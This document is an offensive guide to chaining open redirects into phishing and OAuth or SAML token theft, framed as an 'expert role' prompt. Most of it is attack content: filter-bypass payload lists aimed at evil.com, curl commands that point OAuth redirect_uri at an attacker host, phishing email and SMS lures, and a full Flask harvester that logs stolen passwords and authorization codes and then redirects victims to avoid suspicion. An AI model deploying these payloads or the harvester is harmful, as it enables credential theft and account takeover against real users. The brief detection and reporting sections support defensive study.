# 24 - Open Redirect to Phishing: Chaining Open Redirect for Phishing and Token Theft

## Expert Role Definition

You are the world's foremost authority on open redirect vulnerabilities and their exploitation for phishing, token theft, and session hijacking. You possess deep expertise in URL parsing, redirect parameter manipulation, filter bypass techniques, and the complete lifecycle of open redirect exploitation. You understand how open redirects undermine user trust by exploiting the visual appearance of legitimate domains, how they enable OAuth and SAML token theft through redirect_uri manipulation, and how they can be chained with other vulnerabilities for maximum impact. Your expertise spans the identification of open redirect parameters across web applications, the development of bypass techniques for common filter implementations, and the chaining of open redirects with XSS, CSRF, session fixation, and credential phishing. You have executed authorized red-team engagements where open redirects were the primary initial access vector, enabling credential theft, token interception, and full account compromise.

## Core Concepts

An open redirect vulnerability exists when a web application accepts a user-controlled URL parameter and redirects the user to that URL without proper validation. The application serves as a trusted intermediary, and the user sees the legitimate domain in the address bar before being redirected to the attacker's destination.

The vulnerability typically occurs in URL parameters used for navigation after login, logout, or other actions. Common parameter names include `return_url`, `next`, `redirect`, `url`, `callback`, `continue`, `dest`, and `redirect_uri`. The application trusts these parameters and performs the redirect server-side.

Open redirects are critical because they exploit user trust. A user sees `target.com/redirect?url=attacker.com` and trusts the `target.com` domain. The redirect happens quickly, and the attacker's page inherits the user's trust in the legitimate domain.

The impact escalates significantly when open redirects are chained with OAuth flows. If the OAuth `redirect_uri` parameter can be manipulated to point to an attacker-controlled domain, the authorization code or access token is sent to the attacker's server instead of the legitimate application.

Open redirects can also be chained with XSS. If the redirect parameter accepts and reflects JavaScript, the open redirect becomes an XSS vector. Even without XSS, the redirect can be used to load malicious content that mimics the legitimate application.

The attack surface includes any URL parameter that triggers a redirect, any meta refresh tag with user-controlled content, any JavaScript-based redirect with user input, and any form action that redirects based on user-controlled parameters.

## Pre-requisite Knowledge

- URL parsing: scheme, authority, path, query parameters, and fragment handling
- HTTP redirects: 301, 302, 303, 307, 308 status codes and their behaviors
- OAuth 2.0: authorization code flow, redirect_uri validation, and token exchange
- SAML 2.0: assertion consumer service, redirect binding, and relay state
- Browser address bar: how users perceive domains and the role of the address bar in trust
- Filter bypass techniques: URL encoding, double encoding, backslash tricks, and parser differentials
- XSS fundamentals: reflected XSS, DOM-based XSS, and the interaction with redirects
- Session management: cookies, SameSite attributes, and session fixation
- Phishing psychology: user trust, visual indicators, and timing of attacks

## Chain Architecture / Attack Flow Diagram

```
                    OPEN REDIRECT ATTACK FLOW
                    =========================

    BASIC OPEN REDIRECT:
    [User] ---> [target.com/redirect?url=evil.com] ---> [evil.com]

    CHAIN A: OAuth Token Theft:
    [User] ---> [target.com/auth?redirect_uri=evil.com/callback]
         |
         |  (User authenticates)
         |
         v
    [target.com] ---> [evil.com/callback?code=AUTH_CODE]
         |
         |  (Attacker exchanges code)
         |
         v
    [evil.com] ---> [target.com/api/token] ---> [Access Token Stolen]

    CHAIN B: Phishing via Trusted Domain:
    [Attacker] ---> [target.com/redirect?url=evil.com/login]
         |
         |  (User sees target.com in address bar)
         |
         v
    [User] ---> [evil.com/login] (looks like target.com login)
         |
         |  (User enters credentials)
         |
         v
    [evil.com] ---> [Credentials Stolen] ---> [target.com/real-login]

    CHAIN C: SAML Token Theft:
    [User] ---> [target.com/sso?redirect=evil.com/saml]
         |
         |  (SAML Assertion sent to redirect)
         |
         v
    [evil.com/saml] ---> [SAML Token Captured]

    FILTER BYPASS TECHNIQUES:
    ┌─────────────────────────────────────────────────────┐
    │ target.com/redirect?url=evil.com                    │  (Blocked)
    │ target.com/redirect?url=//evil.com                  │  (May bypass)
    │ target.com/redirect?url=https://evil.com            │  (May bypass)
    │ target.com/redirect?url=target.com@evil.com         │  (Authority trick)
    │ target.com/redirect?url=target.com%00@evil.com      │  (Null byte)
    │ target.com/redirect?url=javascript:alert(1)         │  (JS protocol)
    │ target.com/redirect?url=data:text/html,<script>     │  (Data URI)
    │ target.com/redirect?url=/\evil.com                  │  (Backslash)
    │ target.com/redirect?url=https://target.com.evil.com │  (Subdomain)
    └─────────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Discovery**

Identify redirect parameters through manual testing and automated scanning:

```bash
# Gobuster for parameter discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt -p redirect

# ParamSpider for parameter mining
python3 paramSpider.py -d target.com

# Manual testing - common redirect parameters
for param in redirect url next return_url callback continue dest goto rurl destination return returnTo next_url redirect_to redirect_url next_url auth_return; do
    echo "Testing: $param"
    curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "https://target.com/login?$param=https://evil.com"
done

# Arjun for hidden parameter discovery
arjun -u https://target.com/endpoint -m GET POST
```

**Phase 2: Filter Analysis**

Analyze the application's redirect filter to identify bypass opportunities:

```python
# Test common filter bypasses
bypasses = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "/\\evil.com",
    "/\\/evil.com",
    "target.com@evil.com",
    "target.com%00@evil.com",
    "target.com%0d%0a@evil.com",
    "https://target.com.evil.com",
    "https://evil.com%23.target.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "https://evil.com%09",
    "https://evil.com%00",
    "https://evil.com%0d",
    "https://evil.com%0a",
    "https://evil.com@target.com",
    "target.com\\.evil.com",
    "https://target.com@evil.com",
    "https://evil.com#.target.com",
    "https://evil.com?target.com",
]

for bypass in bypasses:
    print(f"Testing: {bypass}")
```

**Phase 3: OAuth Redirect URI Manipulation**

Test if the OAuth flow's redirect_uri parameter is vulnerable:

```bash
# Intercept OAuth authorization request
# Change redirect_uri to attacker-controlled domain

# Standard OAuth flow
curl "https://target.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://evil.com/callback&response_type=code&scope=read"

# If redirect_uri is validated against a whitelist, try:
# 1. Open redirect on target.com
curl "https://target.com/redirect?url=https://evil.com/callback"
# 2. Subdomain takeover
curl "https://target.com/oauth/authorize?redirect_uri=https://sub.target.com/callback"
# 3. Parameter pollution
curl "https://target.com/oauth/authorize?redirect_uri=https://legitimate.com&redirect_uri=https://evil.com/callback"
```

**Phase 4: Payload Delivery**

Deliver the malicious redirect URL to victims:

```bash
# Phishing email with redirect URL
# Subject: Urgent: Verify your account
# Body: Click here to verify: https://target.com/redirect?next=https://evil.com/verify

# Shortened URL to mask the redirect
# Use bit.ly or similar to shorten: https://target.com/redirect?url=https://evil.com

# XSS payload to trigger redirect
<img src="https://target.com/redirect?url=https://evil.com" style="display:none">

# Social media post with redirect link
# "Check out this new feature: https://target.com/redirect?url=https://evil.com/feature"
```

**Phase 5: Credential and Token Capture**

Set up infrastructure to capture stolen credentials and tokens:

```bash
# Simple credential harvester
cat << 'EOF' > harvester.py
from flask import Flask, request, redirect
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    state = request.args.get('state')
    # Log stolen OAuth code
    with open('stolen_tokens.txt', 'a') as f:
        f.write(f"Code: {code}, State: {state}\n")
    # Redirect to legitimate app to avoid suspicion
    return redirect('https://target.com/dashboard')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('stolen_credentials.txt', 'a') as f:
            f.write(f"Username: {username}, Password: {password}\n")
        return redirect('https://target.com/dashboard')
    return open('fake_login.html').read()

app.run(port=443, ssl_context='adhoc')
EOF
python3 harvester.py
```

## Tool Arsenal

```bash
# Gobuster - directory and parameter discovery
gobuster dir -u https://target.com -w /usr/share/wordlists/common.txt

# Arjun - hidden parameter discovery
arjun -u https://target.com/endpoint

# ParamSpider - parameter mining
python3 paramSpider.py -d target.com

# Burp Suite - manual testing with Repeater and Intruder
# Use the match and replace rules to test bypasses

# curl - quick redirect testing
curl -v -L "https://target.com/redirect?url=https://evil.com"

# Python requests for automated testing
python3 -c "
import requests
bypasses = ['https://evil.com', '//evil.com', '/\\\\evil.com', 'target.com@evil.com']
for b in bypasses:
    r = requests.get(f'https://target.com/redirect?url={b}', allow_redirects=False)
    print(f'{b}: {r.status_code} -> {r.headers.get(\"Location\", \"no redirect\")}')"

# SSRFMap - for testing SSRF via redirect
ssrfmap -u https://target.com/redirect -p url -m portscan

# Phishing infrastructure
# Use GoPhish for campaign management
# Use SET (Social Engineering Toolkit) for payload generation

# URL encoding tools
python3 -c "import urllib.parse; print(urllib.parse.quote('https://evil.com'))"

# Burp Collaborator - for out-of-band detection
# Use Collaborator payload in redirect parameters
```

## Real-World Case Studies

**Case Study 1: OAuth Token Theft via Open Redirect**

A SaaS application had an open redirect in its `return_url` parameter after login. An attacker:
1. Discovered the open redirect: `https://app.target.com/login?return_url=https://evil.com`
2. Identified the OAuth flow using the same `return_url` parameter
3. Crafted a URL: `https://app.target.com/oauth/authorize?client_id=APP_ID&redirect_uri=https://evil.com/callback&response_type=code`
4. Sent phishing emails to employees with the malicious OAuth URL
5. Employees authenticated, and the authorization code was sent to the attacker's server
6. Attacker exchanged the code for access tokens
7. Accessed employee accounts and exfiltrated sensitive data

Impact: 150 employee accounts compromised, intellectual property theft, estimated $1.5M in damages.

**Case Study 2: SAML Assertion Theft via Redirect**

An enterprise SSO implementation used SAML with a redirect binding. The SSO endpoint had an open redirect:
1. Attacker discovered `https://sso.target.com/saml/authorize?redirect=https://evil.com`
2. Crafted a SAML request that would be redirected to the attacker's server
3. The SAML assertion containing user attributes and session tokens was sent to the attacker
4. Attacker replayed the SAML assertion to gain access to the enterprise portal
5. Used the portal access to enumerate internal resources
6. Lateral movement to production infrastructure

Impact: Full enterprise compromise, access to internal systems, estimated $5M in damages.

**Case Study 3: Credential Phishing with Brand Trust**

A bank's mobile application used an open redirect for deep linking. An attacker:
1. Created a convincing replica of the bank's login page
2. Used the open redirect to make the phishing URL appear legitimate
3. Sent SMS messages with the URL: `https://bank.com/verify?to=https://fake-login.com`
4. Users saw `bank.com` in the URL and trusted it
5. Entered their credentials on the fake login page
6. Attacker used stolen credentials to access bank accounts
7. Transferred funds to mule accounts

Impact: 500+ customers phished, $2M in fraudulent transfers, regulatory investigation.

## Bypass Techniques and Evasion

**Whitelist Bypass:** If the application whitelists specific domains, bypass by:
- Using subdomains of whitelisted domains: `evil.com.target.com`
- Exploiting parser differentials between the whitelist checker and the browser
- Using URL encoding to obfuscate the malicious domain
- Chaining with subdomain takeover on a whitelisted domain

**Blacklist Bypass:** If the application blacklists specific patterns, bypass by:
- Using alternative URL schemes: `javascript:`, `data:`, `vbscript:`
- Using URL encoding for blacklisted characters
- Using double encoding for additional obfuscation
- Using backslash or forward slash tricks to break pattern matching

**Protocol Restriction Bypass:** If the application restricts to HTTPS, bypass by:
- Using `//evil.com` which inherits the current protocol
- Using `https://evil.com` which may bypass protocol-only checks
- Exploiting applications that check the scheme but not the full URL

**Domain Validation Bypass:** If the application validates the domain, bypass by:
- Using `target.com@evil.com` to confuse the parser
- Using `evil.com%23.target.com` to use fragment manipulation
- Using `evil.com%00.target.com` to exploit null byte injection
- Using `target.com.evil.com` to use a subdomain of the attacker's domain

## Defensive Indicators / Detection

**Network Monitoring:**
- Unusual redirect patterns with high redirect counts
- Redirects to newly registered or low-reputation domains
- Redirects that change the URL scheme from HTTPS to HTTP
- Redirect chains with more than 3 hops

**Application Monitoring:**
- Redirect parameters accepting external URLs
- Redirect parameters with multiple bypass attempts in logs
- Redirect parameters with encoded or obfuscated values
- OAuth flows with modified redirect_uri values

**User Behavior Monitoring:**
- Users reporting unexpected redirects after clicking legitimate links
- Login attempts from domains that appear similar to the legitimate domain
- OAuth token exchanges from unexpected IP addresses

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Credential Exposure | No credentials | Username only | Username + password | MFA tokens |
| Token Exposure | Low-privilege token | Standard user token | Admin token | OAuth refresh token |
| User Impact | Single user | Multiple users | All users in domain | Cross-domain users |
| Business Impact | Minor inconvenience | Account compromise | Data breach | Financial fraud |
| Brand Damage | None | Limited exposure | Media coverage | Regulatory action |

## Common Pitfalls and Anti-Patterns

- Not testing all redirect parameters: Applications may have multiple redirect points
- Assuming HTTPS is sufficient: HTTPS does not prevent open redirects; the redirect itself can be to an HTTPS attacker site
- Ignoring JavaScript-based redirects: Client-side redirects are also exploitable
- Not considering mobile deep links: Mobile applications often use custom URL schemes for redirects
- Forgetting about logout redirects: Logout flows often have less validation than login flows
- Not testing API endpoints: REST APIs may have redirect parameters that are not tested

## Advanced Variations

**Open Redirect via Host Header Injection:** When the application uses the Host header for redirect construction, injecting a malicious Host header can cause open redirects without any URL parameters.

**Open Redirect via CRLF Injection:** Injecting carriage return and line feed characters into headers can cause response splitting, which can be chained with redirects.

**Open Redirect via JavaScript Prototype Pollution:** If the application uses JavaScript for redirects and is vulnerable to prototype pollution, the redirect URL can be manipulated through prototype pollution.

**Open Redirect in Mobile Deep Links:** Mobile applications often use deep links for redirects. If the deep link handler does not validate URLs, it can be exploited for open redirects.

**Open Redirect via DNS Rebinding:** Combine DNS rebinding with open redirects to create persistent redirect infrastructure.

## Integration with Other Chains

Open redirect integrates powerfully with OAuth Token Theft where the redirect captures authorization codes, Phishing Chains where the redirect leverages brand trust, XSS Chains where the redirect delivers XSS payloads, Session Hijacking where the redirect enables session fixation, CSRF where the redirect can be used to trigger CSRF attacks on other sites, and Account Takeover where the redirect enables credential theft.

## Reporting and Documentation

**Report Structure:**
1. Title: Open Redirect in [Parameter] Enables [Impact]
2. Vulnerability Type: Unvalidated Redirect
3. Affected URL: Full URL with vulnerable parameter
4. Filter Analysis: What validation exists and how it is bypassed
5. Impact Scenario: OAuth token theft, credential phishing, or other impact
6. Reproduction Steps: Exact URL and steps to reproduce
7. Remediation: URL validation, whitelisting, and user confirmation

**CVSS Scoring**: 6.1 (Medium) for basic open redirect, 8.1 (High) when chained with OAuth token theft.

## Practice Labs and Exercises

1. PortSwigger Labs: Complete all open redirect labs on Web Security Academy
2. OWASP WebGoat: Practice open redirect exploitation on WebGoat
3. Custom Lab: Set up a test application with various redirect filter implementations
4. OAuth Chaining: Practice chaining open redirects with OAuth flows
5. Filter Bypass Practice: Develop bypass techniques for common redirect filters
